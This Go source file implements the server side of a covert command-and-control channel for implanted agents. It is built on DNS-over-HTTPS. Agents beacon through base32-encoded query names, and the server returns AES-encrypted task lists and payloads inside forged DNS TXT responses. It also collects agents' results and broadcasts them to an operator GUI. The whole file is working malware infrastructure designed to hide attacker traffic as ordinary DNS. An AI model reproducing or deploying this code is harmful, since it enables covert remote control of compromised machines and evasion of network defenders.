package server

// agentDoHQuery implements a lightweight DNS-over-HTTPS endpoint that acts as a
// covert C2 channel.  Agents GET /dns-query?name=<encoded>&type=TXT; the server
// decodes the beacon data from "name", dispatches tasks, and returns responses as
// minimal DNS wireformat TXT records (Content-Type: application/dns-message).
//
// Name formats (matches transport_doh.go):
//   b.<base32(agentID)>               beacon poll
//   r.<base32(JSON{a:id, d:b64ct})>   result submission

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
)

// dohSvrB32 is the base32 codec used server-side for DoH name parsing.
var dohSvrB32 = base32.StdEncoding.WithPadding(base32.NoPadding)

// dohDecodeServerSide strips dots, upper-cases, and base32-decodes a DoH name label.
func dohDecodeServerSide(encoded string) ([]byte, error) {
	clean := strings.ReplaceAll(strings.ToUpper(encoded), ".", "")
	return dohSvrB32.DecodeString(clean)
}

// dohBuildResponse builds a minimal DNS response carrying a single TXT record.
// The DNS header has QDCOUNT=0 (no question echo) to keep the builder simple.
// txtData is split into 255-byte character-strings as required by RFC 1035.
// Passing an empty/nil txtData returns a NODATA response (ANCOUNT=0).
func dohBuildResponse(txtData []byte) []byte {
	var b []byte
	// Transaction ID — fixed; the client does not validate it.
	b = append(b, 0xab, 0xcd)
	// Flags: QR=1 AA=1 RD=1 RA=1, RCODE=NOERROR
	b = append(b, 0x85, 0x80)
	// QDCOUNT = 0
	b = append(b, 0x00, 0x00)

	if len(txtData) == 0 {
		// ANCOUNT=NSCOUNT=ARCOUNT=0
		b = append(b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
		return b
	}

	// ANCOUNT=1, NSCOUNT=0, ARCOUNT=0
	b = append(b, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00)

	// Answer NAME: root label (single 0x00 byte)
	b = append(b, 0x00)
	// TYPE=TXT(16), CLASS=IN(1)
	b = append(b, 0x00, 0x10, 0x00, 0x01)
	// TTL=0 (no caching)
	b = append(b, 0x00, 0x00, 0x00, 0x00)

	// Build TXT RDATA: split txtData into 255-byte character-strings.
	var rdata []byte
	remaining := txtData
	for len(remaining) > 0 {
		chunkLen := 255
		if len(remaining) < chunkLen {
			chunkLen = len(remaining)
		}
		rdata = append(rdata, byte(chunkLen))
		rdata = append(rdata, remaining[:chunkLen]...)
		remaining = remaining[chunkLen:]
	}

	// RDLENGTH
	b = append(b, byte(len(rdata)>>8), byte(len(rdata)))
	b = append(b, rdata...)
	return b
}

// agentDoHQuery is the HTTP handler for GET /dns-query.
func (s *Server) agentDoHQuery(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	name := r.URL.Query().Get("name")
	if name == "" {
		http.Error(w, "missing name parameter", http.StatusBadRequest)
		return
	}

	// First label is the operation prefix (b=beacon, r=result).
	dotIdx := strings.Index(name, ".")
	if dotIdx < 0 || dotIdx == len(name)-1 {
		http.Error(w, "invalid name format", http.StatusBadRequest)
		return
	}
	op := name[:dotIdx]
	rest := name[dotIdx+1:]

	switch op {
	case "b":
		s.dohBeacon(w, rest)
	case "r":
		s.dohResult(w, rest)
	default:
		http.Error(w, "unknown operation", http.StatusBadRequest)
	}
}

// dohBeacon handles beacon poll requests.
// encoded = base32(agentID)
func (s *Server) dohBeacon(w http.ResponseWriter, encoded string) {
	agentIDBytes, err := dohDecodeServerSide(encoded)
	if err != nil {
		http.Error(w, "decode error", http.StatusBadRequest)
		return
	}
	agentID := string(agentIDBytes)

	ag, err := s.db.GetAgent(agentID)
	if err != nil || !ag.Active {
		// Unknown agent — return NODATA (204).
		w.WriteHeader(http.StatusNoContent)
		return
	}
	s.db.TouchAgent(agentID)

	tasks, err := s.db.PendingTasks(agentID)
	if err != nil || len(tasks) == 0 {
		// No pending tasks — return 204 so the agent skips decryption.
		w.WriteHeader(http.StatusNoContent)
		return
	}

	var wires []taskWire
	for _, t := range tasks {
		tw := taskWire{ID: t.ID, Type: t.Type, Args: t.Args}
		if len(t.Payload) > 0 {
			tw.Payload = base64.StdEncoding.EncodeToString(t.Payload)
		}
		wires = append(wires, tw)
		s.db.MarkTaskFetched(t.ID)
	}

	plaintext, _ := json.Marshal(beaconResponse{Tasks: wires})
	encrypted, err := Seal(ag.AESKey, plaintext)
	if err != nil {
		http.Error(w, "encrypt error", http.StatusInternalServerError)
		return
	}

	// Return base64(ciphertext) as a DNS TXT record.
	txtData := []byte(base64.StdEncoding.EncodeToString(encrypted))
	w.Header().Set("Content-Type", "application/dns-message")
	w.Write(dohBuildResponse(txtData)) //nolint:errcheck
}

// dohResult handles result submission requests.
// encoded = base32(JSON{"a":<agentID>,"d":<base64(ciphertext)>})
func (s *Server) dohResult(w http.ResponseWriter, encoded string) {
	payload, err := dohDecodeServerSide(encoded)
	if err != nil {
		http.Error(w, "decode error", http.StatusBadRequest)
		return
	}

	var params struct {
		AgentID    string `json:"a"`
		CipherData string `json:"d"`
	}
	if err := json.Unmarshal(payload, &params); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}
	if params.AgentID == "" || params.CipherData == "" {
		http.Error(w, "missing fields", http.StatusBadRequest)
		return
	}

	ag, err := s.db.GetAgent(params.AgentID)
	if err != nil {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}

	ciphertext, err := base64.StdEncoding.DecodeString(params.CipherData)
	if err != nil {
		http.Error(w, "bad base64", http.StatusBadRequest)
		return
	}

	plaintext, err := Open(ag.AESKey, ciphertext)
	if err != nil {
		http.Error(w, "decrypt error", http.StatusBadRequest)
		return
	}

	var req resultRequest
	if err := json.Unmarshal(plaintext, &req); err != nil {
		http.Error(w, "bad result json", http.StatusBadRequest)
		return
	}

	s.db.InsertResult(req.TaskID, params.AgentID, req.Output, req.Error)

	if req.Output != "" {
		s.printf("[%s] doh task %d output:\n%s\n", params.AgentID[:8], req.TaskID, req.Output)
		BroadcastGUI("TASK_RESULT", params.AgentID, fmt.Sprintf("task #%d complete", req.TaskID))
	}
	if req.Error != "" {
		s.printf("[%s] doh task %d error: %s\n", params.AgentID[:8], req.TaskID, req.Error)
		BroadcastGUI("TASK_RESULT", params.AgentID, fmt.Sprintf("task #%d error: %s", req.TaskID, req.Error))
	}

	// Return "ack" as a DNS TXT record.
	w.Header().Set("Content-Type", "application/dns-message")
	w.Write(dohBuildResponse([]byte("ack"))) //nolint:errcheck
}
